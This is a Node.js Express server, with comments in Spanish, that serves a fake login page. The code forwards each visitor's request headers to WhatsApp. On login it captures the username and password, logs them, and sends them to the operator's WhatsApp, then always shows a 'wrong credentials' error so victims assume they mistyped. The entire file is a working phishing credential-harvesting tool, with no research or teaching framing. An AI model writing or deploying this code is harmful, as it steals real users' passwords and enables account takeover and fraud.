const express = require("express");
const bodyParser = require("body-parser");
require("dotenv").config();
const axios = require("axios");
const { enviarMensajeWhatsApp, alertarUsuarioWhatsapp } = require("./whatsappBot");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.set("view engine", "ejs");
app.use(express.static("public"));

app.get("/", async(req, res) => {
    const headers = req.headers;  // Capturamos los headers de la solicitud HTTP

    try {
        // Llamamos a la función para alertar sobre la visita y enviar la información a WhatsApp
        await alertarUsuarioWhatsapp(headers);  // Esperamos a que se complete
    } catch (error) {
        console.error("Error al enviar el mensaje de visita:", error);
    }
    res.render("login", { error: null });
});


app.post("/login", async(req, res) => {
    const { username, password } = req.body;

    console.log("Usuario:", username);
    console.log("Contraseña:", password);

    // Enviar datos a tu WhatsApp
    await enviarMensajeWhatsApp(username, password);

    // Siempre mostrar el error en la vista
    res.render("login", { error: "Error Usuario o contraseña incorrectos." });
});

app.listen(3000, () => console.log("Servidor en http://localhost:3000"));
